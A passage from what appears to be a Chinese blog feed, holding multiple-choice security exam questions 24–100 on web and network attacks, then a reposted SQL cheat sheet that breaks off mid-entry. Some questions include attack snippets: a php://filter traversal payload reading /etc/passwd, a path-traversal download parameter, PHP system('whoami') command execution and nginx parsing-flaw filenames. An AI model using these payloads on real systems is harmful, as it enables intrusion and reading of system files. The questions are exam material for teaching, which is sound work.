分）</p><p>source</p><p>warehouse</p><p>objects</p><p>pristine<br>24.（单选题）<br>内网横向移动时经常利用的GPP漏洞，和Windows系统的哪一项组件密切相关（）。<br>（4 分）</p><p>注册表</p><p>SMB服务</p><p>组策略</p><p>本地安全策略<br>25.（单选题）<br>采用TCP/IP数据封装时，以下哪个端口号范围标识了所有常用应用程序<br>（4 分）</p><p>0到255</p><p>256到1023</p><p>0到1023</p><p>1024到2047<br>26.（单选题）<br>在DDOS攻击中，TCP的SYN攻击主要利用了TCP（）原理<br>（4 分）</p><p>滑动窗口</p><p>三次握手</p><p>四次挥手</p><p>流量控制<br>27.（单选题）<br>通过TCP序号猜测，攻击者可以实施下列哪一种攻击<br>（4 分）</p><p>端口扫描攻击</p><p>ARP欺骗攻击</p><p>网络监听攻击</p><p>TCP会话劫持攻击<br>28.（单选题）<br>关于以下函数描述正确的是（）<br>（4 分）</p><p>eval()函数将输入的内容作为系统命令执行</p><p>assert()函数作用与eval()函数相同</p><p>exec()函数返回执行结果的全部数据</p><p>shell_exec()函数返回执行结果的最后一行数据<br>29.（单选题）<br>以下哪个是具备htmlEncode功能的标签（）<br>（4 分）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>30.（单选题）<br>在windows域中，如果想使用kerberos身份验证，一般流程是（）<br>（4 分）</p><p>客户端申请获得票据许可票据（TGT），客户端申请获得服务许可票据（SGT），客户申请获得服务许可访问服务器。</p><p>客户端申请获得服务许可票据（SGT），客户端申请获得票据许可票据（TGT），客户申请获得服务许可访问服务器。</p><p>客户端申请获得服务许可访问服务器，客户端获得票据许可票据（TGT），客户端申请获得服务许可票据（SGT），客户访问服务器。</p><p>服务端申请获得服务许可访问服务器，服务端获得票据许可票据（SGT），服务端申请获得服务许可票据（TGT），服务端推送服务至客户端。<br>31.（多选题）<br>php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd<br>假设某PHP页面存在文件包含漏洞，上述Payload可以获得哪些信息（）<br>（4 分）</p><p>Linux系统中所有的用户名</p><p>Windows系统中所有的用户名</p><p>系统中各个用户的权限以及可执行文件所在目录</p><p>用户密码<br>32.（单选题）<br>下列选项不属于信息安全三要素的是哪一项？<br>（4 分）</p><p>机密性</p><p>可抵赖性</p><p>完整性</p><p>可用性<br>33.（多选题）<br>Windows 7系统中，创建隐藏账户hider的主要步骤包括（）。<br>（4 分）</p><p>创建用户hider</p><p>hider键值导入注册表</p><p>删除hider </p><p>导出hider键值<br>34.（单选题）<br>ARP欺骗的实质是哪一选项？<br>（4 分）</p><p>提供虚拟的MAC与IP地址的组合</p><p>让其他计算机知道自己的存在</p><p>窃取用户在网络中的传输的数据</p><p>扰乱网络的正常运行<br>35.（单选题）<br>当请求资源不存在是，返回的响应码是？<br>（4 分）</p><p>400</p><p>401</p><p>403</p><p>404<br>36.（多选题）<br>在Mysql数据库中，基于时间的盲注常使用的延迟函数有（）<br>（4 分）</p><p>benchmark（）函数</p><p>substr（）函数</p><p>sleep（）函数</p><p>hash（）函数<br>37.（多选题）<br>通用入侵检测模型（CIDF）中包含下列哪些组件？（  ）<br>（4 分）</p><p>事件产生器</p><p>事件分析器</p><p>响应单元</p><p>事件数据库<br>38.（单选题）<br>密码学在区块链的应用中，工作量证明主要使用下面哪种算法（）</p><p>（4 分）</p><p>对称加密算法</p><p>哈希算法</p><p>非对称加密算法</p><p>密钥交换算法<br>39.（多选题）<br>操作系统安全机制包括（）。<br>（4 分）</p><p>访问控制</p><p>安全审计</p><p>运行保护</p><p>硬件保护<br>40.（单选题）<br>阻止恶意文件上传比较有效的方法是（）<br>（4 分）</p><p>白名单后缀</p><p>黑名单后缀</p><p>过滤敏感字符</p><p>替换敏感字符<br>41.（单选题）<br>802.11采用的WEP加密所使用的核心加密算法（）<br>（4 分）</p><p>AES</p><p>RC4</p><p>MD5</p><p>DES<br>42.（单选题）<br>IP地址中B类地址具有多少位主机号？<br>（4 分）</p><p>8</p><p>16</p><p>24</p><p>31<br>43.（单选题）<br>下列措施中不能增强DNS安全的是哪一选项？<br>（4 分）</p><p>使用最新的BIND工具</p><p>双反向查找</p><p>更改DNS的端口号</p><p>不要让HINFO记录被外界看到<br>44.（单选题）<br>以下哪种方法在PHP开发语言中不能执行命令（）<br>（4 分）</p><p>system(whoami);</p><p>system(‘whoami’);</p><p>system(‘eval(whoami);’);</p><p>eval(‘system(whoami);’);<br>45.（单选题）<br>在windows域中，如果想使用kerberos身份验证，服务实例需要注册一个什么（）。<br>（4 分）</p><p>SPN</p><p>PTK</p><p>Session</p><p>Cookie<br>46.（单选题）<br>IP协议工作在TCP/IP的哪一层？<br>（4 分）</p><p>物理层</p><p>链路层</p><p>网络层</p><p>传输层<br>47.（多选题）<br>域树在两个域之间的关系可以是（）。</p><p>（4 分）</p><p>不可传递信任关系</p><p>双向信任关系</p><p>单向信任关系</p><p>可传递信息关系<br>48.（单选题）<br>BASE64编码的64个字符中，不包含( )<br>（4 分）</p><p>+</p><p>/</p><p>=</p><p>0<br>49.（单选题）<br>产生CSRF漏洞的原因是（）<br>（4 分）</p><p>对用户的输入没有做过滤</p><p>对IP地址没有做限制</p><p>对用户的敏感操作缺乏二次验证</p><p>对用户的cookie缺乏验证<br>50.（单选题）<br>网络监听（嗅探）的这种攻击形式破坏了下列哪一项内容<br>（4 分）</p><p>网络信息的抗抵赖性</p><p>网络信息的保密性</p><p>网络服务的可用性</p><p>网络信息的完整性<br>51.（多选题）<br>哪些场景容易出现SSRF漏洞（）<br>（4 分）</p><p>分享</p><p>上传</p><p>收藏</p><p>翻译网页<br>52.（多选题）<br>使用00截断绕过文件上传检测，需要注意的是（）<br>（4 分）</p><p>php版本小于5.3.4</p><p>magic_quotes_gpc参数为off</p><p>业务系统是否适合使用00截断</p><p>上传文件添加十六进制图片头<br>53.（单选题）<br>关于命令执行漏洞的描述，正确的是（）<br>（4 分）</p><p>命令执行漏洞仅存在于C/S架构中</p><p>命令执行漏洞危害不大</p><p>命令执行漏洞与用户输入无关</p><p>大多数脚本语言都可以调用操作系统命令<br>54.（多选题）<br>下列哪些方式可以收集子域名（）<br>（4 分）</p><p>爆破</p><p>利用搜索引擎挖掘</p><p>利用域传送漏洞</p><p>利用CSRF漏洞<br>55.（多选题）<br>跟Windows的账号密码存储有关的文件有（）<br>（4 分）</p><p>LM-Hash</p><p>/etc/password</p><p>NTLM-Hash</p><p>SAM<br>56.（单选题）<br>下面哪个字段是HTTP请求中必须的？<br>（4 分）</p><p>Cookie</p><p>Host</p><p>Accept</p><p>Content-Length<br>57.（单选题）<br>内网渗透中经常使用到Metasploit平台的Meterpreter模块属于（）功能的组件。<br>（4 分）</p><p>编码模块</p><p>攻击载荷模块</p><p>空指令模块</p><p>后渗透攻击模块<br>58.（单选题）<br>使用DDOS攻击WEB中某一链接时，最好的防御思路是<br>（4 分）</p><p>加入验证码，识别机器发送流量</p><p>使用流量清洗设备</p><p>购买抗DDOS防火墙</p><p>移除WEB中的链接<br>59.（多选题）<br>下列哪些是DNS的记录类型<br>（4 分）</p><p>A</p><p>AAAA</p><p>NS</p><p>HINFO<br>60.（单选题）<br>RSA算法，已知p=7，q=17， e=5 则d可能为（）<br>（4 分）</p><p>67</p><p>61</p><p>77</p><p>73<br>61.（多选题）<br>实现XSS蠕虫常用的技术有（）<br>（4 分）</p><p>DOM</p><p>Ajax</p><p>社会工程学</p><p>SQL语法<br>62.（单选题）<br>GIT版本控制系统，添加到仓库文件所使用哪种编码进行压缩文件（）<br>（4 分）</p><p>ASCII</p><p>Zlib</p><p>Gz</p><p>Bz<br>63.（单选题）<br>关于入侵检测系统，下列说法正确的是（ ）。<br>（4 分）</p><p>入侵检测系统可以检测到所有的入侵行为</p><p>入侵检测系统不可避免存在误报问题</p><p>入侵检测系统可以对网络数据包进行过滤</p><p>入侵检测系统只支持TCP、UDP及其之上的应用层协议<br>64.（多选题）<br>网络入侵检测系统（NIDS）可根据（ ）等特征检测和识别网络入侵行为。<br>（4 分）</p><p>IP地址与端口号</p><p>TCP标志位</p><p>数据包长度</p><p>数据包中的特定字符串<br>65.（单选题）<br>HTTP协议返回Server字段中可以提取下列哪项信息（）<br>（4 分）</p><p>数据库信息</p><p>操作系统内核</p><p>用户请求的User-Agent</p><p>中间件服务<br>66.（单选题）<br>当今，流行的DDOS攻击主要以攻击（）为主要目标<br>（4 分）</p><p>存储资源</p><p>CPU资源</p><p>内存资源</p><p>网络资源<br>67.（单选题）<br>Windows10操作系统上比较重要的一项安全策略UAC策略的主要作用是（）。<br>（4 分）</p><p>密码访问控制</p><p>密码访问策略</p><p>用户账户控制</p><p>账户访问控制<br>68.（单选题）<br>将MAC地址转换为IP地址的协议是？<br>（4 分）</p><p>ARP</p><p>RARP</p><p>IP</p><p>NTP<br>69.（单选题）<br>关于文件解析防御的说法，不正确的是（）<br>（4 分）</p><p>文件解析漏洞是因为配置错误导致，采用安全的配置就能防御文件上传</p><p>系统开发过程中开启的便利功能，在上线前要严格检查</p><p>在防御文件上传漏洞的同时也要留意其他漏洞</p><p>及时更新中间件版本，补丁<br>70.（单选题）<br>在防火墙中，可利用（ ）技术实现IP地址复用以及隐藏内部网络IP地址的功能。<br>（4 分）</p><p>包过滤</p><p>代理服务</p><p>NAT</p><p>状态检测<br>71.（单选题）<br>OSI参考模型分几层？<br>（4 分）</p><p>4</p><p>5</p><p>6</p><p>7<br>72.（多选题）<br>LAMP下的WEB网站加固方法包括（    ）。<br>（4 分）</p><p>升级Linux版本并进行安全加固</p><p>禁止上传文件</p><p>上传目录去掉执行权</p><p>仅允许上传图片文件</p><p>以一般用户运行apache服务器<br>73.（单选题）<br>SQL注入主要危害的是什么组件里面的信息（）。<br>（4 分）</p><p>内存堆栈</p><p>数据库</p><p>HTML页面</p><p>浏览器<br>74.（单选题）<br>Active Directory(活动目录)中的数据库文件是（）？<br>（4 分）</p><p>NTDS.dit</p><p>SAM.dit</p><p>PASS.dit</p><p>USER.dit<br>75.（单选题）<br>https是指以下哪种协议？<br>（4 分）</p><p>TLS/SSL加密的HTTP协议</p><p>TLS/SSL加密的DNS协议</p><p>TLS/SSL加密的SMTP协议</p><p>TLS/SSL加密的POP3协议<br>76.（多选题）<br>上传文件后缀检测，常见的方法有（）<br>（4 分）</p><p>JS调用select()函数</p><p>PHP调用pathinfo()函数</p><p>getimagesize() 函数</p><p>PHP addslashes()函数<br>77.（单选题）<br>（  ）是一种在互联网上运行的计算机系统，它是专门为吸引并诱骗那些试图非法闯入他人计算机系统的人（如黑客）而设计的。<br>（4 分）</p><p>傀儡计算机</p><p>入侵检测系统</p><p>蜜罐</p><p>入侵防御系统<br>78.（单选题）<br>DDOS的大流量攻击中，主要是（）报文比较多<br>（4 分）</p><p>TCP</p><p>UDP</p><p>ICMP</p><p>广播<br>79.（单选题）<br>Windows域中，使用kerberos身份验证过程中的PTT传递的是（）<br>（4 分）</p><p>哈希</p><p>票据</p><p>密码</p><p>服务<br>80.（单选题）<br>宽字节注入利用漏洞原理主要是基于（）<br>（4 分）</p><p>汉字编码中gbk和uft-8的不统一</p><p>数据库对输入长度控制不严引起</p><p>URL提交请求中的特殊符号引起</p><p>URL提交请求中的大小写没有过滤引起<br>81.（单选题）<br>以下哪个文件格式是利用nginx解析漏洞的（）<br>（4 分）</p><p>/test.asp;1.jpg</p><p>/test.jpg/test.php</p><p>/test.asp/test.jpg</p><p>/test.php.xxx<br>82.（单选题）<br>TCP协议建立连接需要几次握手？<br>（4 分）</p><p>2</p><p>3</p><p>4</p><p>5<br>83.（单选题）<br>已知上级目录下的db目录包含敏感文件db.rar, 以下哪个请求可以下载到该文件（）<br>（4 分）</p><p>?download=db.rar</p><p>?download=../db/db.rar</p><p>?download=db/db.rar</p><p>?download=./db/db.rar<br>84.（多选题）<br>HTTP返回下列哪些状态码证明目录存在（）<br>（4 分）</p><p>200</p><p>403</p><p>404</p><p>401<br>85.（单选题）<br>“防火墙的物理接口均未配置IP地址，它在网络中的作用相当于一台二层交换机”。根据以上描述判断，该防火墙最有可能工作在（  ）模式。<br>（4 分）</p><p>路由</p><p>透明（桥接）</p><p>冗余</p><p>混合<br>86.（单选题）<br>nmap –PS 扫描参数具体含义（）<br>（4 分）</p><p>使用SCTP扫描主机存活</p><p>使用TCP Syn扫描主机存活</p><p>使用TCP Syn 扫描端口开放</p><p>使用Ping 探测主机存活<br>87.（多选题）<br>IPSec VPN的数据封装模式包括（  ）。<br>（4 分）</p><p>传输模式</p><p>路由模式</p><p>加密模式</p><p>隧道模式<br>88.（单选题）<br>利用虚假IP地址进行ICMP报文传输的攻击方法称为什么攻击？<br>（4 分）</p><p>ICMP泛洪</p><p>死亡之ping</p><p>LAND攻击</p><p>Smurf攻击<br>89.（单选题）<br>内网linux系统中常使用scp命令在网络上的主机之间复制文件。 它使用（）协议进行数据传输<br>（4 分）</p><p>FTP</p><p>Telnet</p><p>IPC</p><p>SSH<br>90.（单选题）<br>防御XSS漏洞的核心思想为（）<br>（4 分）</p><p>禁止用户输入</p><p>输入过滤，输出编码</p><p>要点击未知链接</p><p>减少使用数据库<br>91.（多选题）<br>SQL查询语句Select * from users Where id=1为了防止被SQL注入利用，通过正则算法把“=”号给过滤不让使用了，那么可以使用sqlmap的tamper目录下的哪些脚本调用来绕过正则检测进行SQL注入？（）<br>（4 分）</p><p>randomcase.py</p><p>equaltolike.py</p><p>charencode.py</p><p>space2comment.py<br>92.（单选题）<br>一般来说，包过滤防火墙依据网络数据包的（  ）执行包过滤规则。<br>（4 分）</p><p>包头信息</p><p>有效载荷信息</p><p>源IP地址</p><p>状态信息<br>93.（单选题）<br>以下哪项是开源网络入侵检测工具？（ ）<br>（4 分）</p><p>Nessus</p><p>Nmap</p><p>Iptables</p><p>Snort<br>94.（多选题）<br>Linux系统账户密码策略加固方法包括（      ）。<br>（4 分）</p><p>账户名长度限制</p><p>密码字符类型限制</p><p>密码最小长度限制</p><p>密码使用时间限制</p><p>限制使用历史密码<br>95.（单选题）<br>下面哪种方式可以进行TCP的流量控制?<br>（4 分）</p><p>滑动窗口</p><p>超时重传</p><p>停止等待</p><p>重传机制<br>96.（单选题）<br>nmap 使用半开放扫描时，若目标端口开放则第三次握手主机将向目标机发送什么标志（）<br>（4 分）</p><p>SYN</p><p>ACK</p><p>RST</p><p>FIN<br>97.（单选题）<br>UDP工作在TCP/IP的哪一层?<br>（4 分）</p><p>传输层</p><p>网络层</p><p>物理层</p><p>应用层<br>98.（单选题）<br>文件包含漏洞的一般特征不包含（）<br>（4 分）</p><p>?page=a.php</p><p>?home=a.html</p><p>?file=content</p><p>?id=1’<br>99.（单选题）<br>Vim 第一次异常退出后，会产生下列哪个异常文件（）<br>（4 分）</p><p>.swp</p><p>.swo</p><p>swq</p><p>swn<br>100.（单选题）<br>SVN 客户端仓库文件中，哪个文件用来记录添加仓库源文件名（）<br>（4 分）</p><p>log.txt</p><p>index</p><p>head.db</p><p>wc.db</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql 速查表</title>
      <link href="/2019/10/18/sql/"/>
      <url>/2019/10/18/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-速查表"><a href="#SQL-速查表" class="headerlink" title="SQL 速查表"></a>SQL 速查表</h1><p>一个所有 SQL 语句用法的速查表。</p><p>转载自github</p><p><a href="https://github.com/enochtangg/quick-SQL-cheatsheet/blob/master/README_zh-hans.md" target="_blank" rel="noopener">https://github.com/enochtangg/quick-SQL-cheatsheet/blob/master/README_zh-hans.md</a></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>1.查找数据的查询<br>2.修改数据的查询<br>3.聚合查询<br>4.连接查询<br>5.视图查询<br>6.修改表的查询</p><h2 id="1-查找数据的查询"><a href="#1-查找数据的查询" class="headerlink" title="1. 查找数据的查询"></a>1. 查找数据的查询</h2><h4 id="SELECT-用于从数据库中选择数据"><a href="#SELECT-用于从数据库中选择数据" class="headerlink" title="SELECT: 用于从数据库中选择数据"></a>SELECT: 用于从数据库中选择数据</h4><p>SELECT * FROM table_name;  </p><h4 id="DISTINCT-用于过滤掉重复的值并返回指定列的行"><a href="#DISTINCT-用于过滤掉重复的值并返回指定列的行" class="headerlink" title="DISTINCT: 用于过滤掉重复的值并返回指定列的行"></a>DISTINCT: 用于过滤掉重复的值并返回指定列的行</h4><p>SELECT DISTINCT column_name; </p><h4 id="WHERE-用于过滤记录-行"><a href="#WHERE-用于过滤记录-行" class="headerlink" title="WHERE: 用于过滤记录/行"></a>WHERE: 用于过滤记录/行</h4><p>SELECT column1, column2 FROM table_name WHERE condition;<br>SELECT * FROM table_name WHERE condition1 AND condition2;<br>SELECT * FROM table_name WHERE condition1 OR condition2;<br>SELECT * FROM table_name WHERE NOT condition;<br>SELECT * FROM table_name WHERE condition1 AND (condition2 OR condition3);<br>SELECT * FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);  </p><h4 id="ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）"><a href="#ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）" class="headerlink" title="ORDER BY: 用于结果集的排序，升序（ASC）或者降序（DESC）"></a>ORDER BY: 用于结果集的排序，升序（ASC）或者降序（DESC）</h4><p>SELECT * FROM table_name ORDER BY column;<br>SELECT * FROM table_name ORDER BY column DESC;<br>SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC;  </p><h4 id="SELECT-TOP-用于指定从表顶部返回的记录数"><a href="#SELECT-TOP-用于指定从表顶部返回的记录数" class="headerlink" title="SELECT TOP: 用于指定从表顶部返回的记录数"></a>SELECT TOP: 用于指定从表顶部返回的记录数</h4><p>SELECT TOP number columns_names FROM table_name WHERE condition;<br>SELECT TOP percent columns_names FROM table_name WHERE condition; </p><p>并非所有数据库系统都支持SELECT TOP。 MySQL 中是LIMIT子句<br>SELECT column_names FROM table_name LIMIT offset, count; </p><h4 id="LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符"><a href="#LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符" class="headerlink" title="LIKE: 用于搜索列中的特定模式，WHERE 子句中使用的运算符"></a>LIKE: 用于搜索列中的特定模式，WHERE 子句中使用的运算符</h4><p>% (percent sign) 是一个表示零个，一个或多个字符的通配符<br>_ (underscore) 是一个表示单个字符通配符<br>SELECT column_names FROM table_name WHERE column_name LIKE pattern;<br>LIKE ‘a%’ （查找任何以“a”开头的值）<br>LIKE ‘%a’ （查找任何以“a”结尾的值）<br>LIKE ‘%or%’ （查找任何包含“or”的值）<br>LIKE ‘<em>r%’ （查找任何第二位是“r”的值）<br>LIKE ‘a</em>%_%’ （查找任何以“a”开头且长度至少为3的值）<br>LIKE ‘[a-c]%’（查找任何以“a”或“b”或“c”开头的值）  </p><h4 id="IN-用于在-WHERE-子句中指定多个值的运算符本质上，IN运算符是多个OR条件的简写"><a href="#IN-用于在-WHERE-子句中指定多个值的运算符本质上，IN运算符是多个OR条件的简写" class="headerlink" title="IN: 用于在 WHERE 子句中指定多个值的运算符本质上，IN运算符是多个OR条件的简写"></a>IN: 用于在 WHERE 子句中指定多个值的运算符本质上，IN运算符是多个OR条件的简写</h4><p>SELECT column_names FROM table_name WHERE column_name IN (value1, value2, …);<br>SELECT column_names FROM table_name WHERE column_name IN (SELECT STATEMENT);  </p><h4 id="BETWEEN-用于过滤给定范围的值的运算符"><a href="#BETWEEN-用于过滤给定范围的值的运算符" class="headerlink" title="BETWEEN: 用于过滤给定范围的值的运算符"></a>BETWEEN: 用于过滤给定范围的值的运算符</h4><p>SELECT column_names FROM table_name WHERE column_name BETWEEN value1 AND value2;<br>SELECT * FROM Products WHERE (column_name BETWEEN value1 AND value2) AND NOT column_name2 IN (value3, value4);<br>SELECT * FROM Products WHERE column_name BETWEEN #01/07/1999# AND #03/12/1999#;  </p><h4 id="NULL-代表一个字段没有值"><a href="#NULL-代表一个字段没有值" class="headerlink" title="NULL: 代表一个字段没有值"></a>NULL: 代表一个字段没有值</h4><p>SELECT * FROM table_name WHERE column_name IS NULL;<br>SELECT * FROM table_name WHERE column_name IS NOT NULL;  </p><h4 id="AS-用于给表或者列分配别名"><a href="#AS-用于给表或者列分配别名" class="headerlink" title="AS: 用于给表或者列分配别名"></a>AS: 用于给表或者列分配别名</h4><p>SELECT column_name AS alias_name FROM table_name;<br>SELECT column_name FROM table_name AS alias_name;<br>SELECT column_name AS alias_name1, column_name2 AS alias_name2;<br>SELECT column_name1, column_name2 + ‘, ‘ + column_name3 AS alias_name;  </p><h4 id="UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符"><a href="#UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符" class="headerlink" title="UNION: 用于组合两个或者多个 SELECT 语句的结果集的运算符"></a>UNION: 用于组合两个或者多个 SELECT 语句的结果集的运算符</h4><p>每个 SELECT 语句必须拥有相同的列数<br>列必须拥有相似的数据类型<br>每个 SELECT 语句中的列也必须具有相同的顺序<br>SELECT columns_names FROM table1 UNION SELECT column_name FROM table2;  </p><h4 id="UNION-仅允许选择不同的值-UNION-ALL-允许重复"><a href="#UNION-仅允许选择不同的值-UNION-ALL-允许重复" class="headerlink" title="UNION 仅允许选择不同的值, UNION ALL 允许重复"></a>UNION 仅允许选择不同的值, UNION ALL 允许重复</h4><h4 id="ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符"><a href="#ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符" class="headerlink" title="ANY|ALL: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符"></a>ANY|ALL: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符</h4><p>ANY 如果任何子查询值满足条件，则返回 true。<br>ALL 如果所有子查询值都满足条件，则返回 true。<br>SELECT columns_names FROM table1 WHERE column_name operator (ANY|ALL) (SELECT column_name FROM table_name WHERE condition);  </p><h4 id="GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"><a href="#GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列" class="headerlink" title="GROUP BY: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"></a>GROUP BY: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列</h4><p>SELECT column_name1, COUNT(column_name2) FROM table_name WHERE condition GROUP BY column_name1 ORDER BY COUNT(column_name2) DESC;  </p><h4 id="HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。"><a href="#HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。" class="headerlink" title="HAVING: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。"></a>HAVING: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。</h4><p>SELECT COUNT(column_name1), column_name2 FROM table GROUP BY column_name2 HAVING COUNT(column_name1) &gt; 5;  </p><h2 id="2-修改数据的查询"><a href="#2-修改数据的查询" class="headerlink" title="2. 修改数据的查询"></a>2. 修改数据的查询</h2><h4 id="INSERT-INTO-用于在表中插入新记录-行"><a href="#INSERT-INTO-用于在表中插入新记录-行" class="headerlink" title="INSERT INTO: 用于在表中插入新记录/行"></a>INSERT INTO: 用于在表中插入新记录/行</h4><p>INSERT INTO table_name (column1, column2) VALUES (value1, value2);<br>INSERT INTO table_name VALUES (value1, value2 …);  </p><h4 id="UPDATE-用于修改表中的现有记录-行"><a href="#UPDATE-用于修改表中的现有记录-行" class="headerlink" title="UPDATE: 用于修改表中的现有记录/行"></a>UPDATE: 用于修改表中的现有记录/行</h4><p>UPDATE table_name SET column1 = value1, column2 = value2 WHERE condition;<br>UPDATE table_name SET column_name = value;  </p><h4 id="DELETE-用于删除表中的现有记录-行"><a href="#DELETE-用于删除表中的现有记录-行" class="headerlink" title="DELETE: 用于删除表中的现有记录/行"></a>DELETE: 用于删除表中的现有记录/行</h4><p>DELETE FROM table_name WHERE condition;<br>DELETE * FROM table_name;  </p><h2 id="3-聚合查询"><a href="#3-聚合查询" class="headerlink" title="3. 聚合查询"></a>3. 聚合查询</h2><h4 id="COUNT-返回出现次数"><a href="#COUNT-返回出现次数" class="headerlink" title="COUNT: 返回出现次数"></a>COUNT: 返回出现次数</h4><p>SELECT COUNT (DISTINCT column_name);  </p><h4 id="MIN-and-MAX-返回所选列的最小-最大值"><a href="#MIN-and-MAX-返回所选列的最小-最大值" class="headerlink" title="MIN() and MAX(): 返回所选列的最小/最大值"></a>MIN() and MAX(): 返回所选列的最小/最大值</h4><p>SELECT MIN (column_names) FROM table_name WHERE condition;<br>SELECT MAX (column_names) FROM table_name WHERE condition;  </p><h4 id="AVG-返回数字列的平均值"><a href="#AVG-返回数字列的平均值" class="headerlink" title="AVG(): 返回数字列的平均值"></a>AVG(): 返回数字列的平均值</h4><p>SELECT AVG (column_name) FROM table_name WHERE condition;  </p><h4 id="SUM-返回数值列的总和"><a href="#SUM-返回数值列的总和" class="headerlink" title="SUM(): 返回数值列的总和"></a>SUM(): 返回数值列的总和</h4><p>SELECT SUM (column_name) FROM table_name WHERE condition;  </p><h2 id="4-连接查询"><a href="#4-连接查询" class="headerlink" title="4. 连接查询"></a>4. 连接查询</h2><h4 id="INNER-JOIN-内连接，返回在两张表中具有匹配值的记录"><a href="#INNER-JOIN-内连接，返回在两张表中具有匹配值的记录" class="headerlink" title="INNER JOIN: 内连接，返回在两张表中具有匹配值的记录"></a>INNER JOIN: 内连接，返回在两张表中具有匹配值的记录</h4><p>SELECT column_names FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name;<br>SELECT table1.column_name1, table2.column_name2, table3.column_name3 FROM ((table1 INNER JOIN table2 ON relationship) INNER JOIN table3 ON relationship);  </p><h4 id="LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"><a href="#LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）" class="headerlink" title="LEFT (OUTER) JOIN: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"></a>LEFT (OUTER) JOIN: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）</h4><p>SELECT column_names FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name;  </p><h4 id="RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"><a href="#RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录" class="headerlink" title="RIGHT (OUTER) JOIN: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"></a>RIGHT (OUTER) JOIN: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录</h4><p>SELECT column_names FROM table1 RIGHT JOIN table2 ON table1.column_name=table2.column_name;  </p><h4 id="FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。"><a href="#FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。" class="headerlink" title="FULL (OUTER) JOIN: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。"></a>FULL (OUTER) JOIN: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。</h4><p>SELECT column_names FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name;  </p><h4 id="Self-JOIN-自连接，表自身连接"><a href="#Self-JOIN-自连接，表自身连接" class="headerlink" title="Self JOIN: 自连接，表自身连接"></a>Self JOIN: 自连接，表自身连接</h4><p>SELECT column_names FROM table1 T1, table1 T2 WHERE condition;  </p><h2 id="5-视图查询"><a href="#5-视图查询" class="headerlink" title="5. 视图查询"></a>5. 视图查询</h2><h4 id="CREATE-创建视图"><a href="#CREATE-创建视图" class="headerlink" title="CREATE: 创建视图"></a>CREATE: 创建视图</h4><p>CREATE VIEW view_name AS SELECT column1, column2 FROM table_name WHERE condition;  </p><h4 id="SELECT-检索视图"><a href="#SELECT-检索视图" class="headerlink" title="SELECT: 检索视图"></a>SELECT: 检索视图</h4><p>SELECT * FROM view_name;  </p><h3 id="DROP-删除视图"><a href="#DROP-删除视图" class="headerlink" title="DROP: 删除视图"></a>DROP: 删除视图</h3><p>DROP VIEW view_name;  </p><h2 id="6-修改表的查询"><a href="#6-修改表的查询" class="headerlink" title="6. 修改表的查询"></a>6. 修改表的查询</h2><h4 id="ADD-添加字段"><a href="#ADD-添加字段" class="headerlink" title="ADD: 添加字段"></a>ADD: 添加字段</h4><p>ALTER TABLE table_name ADD column_name column_definition;  </p><h4 id="MODIFY-修改字段数据类型"><a 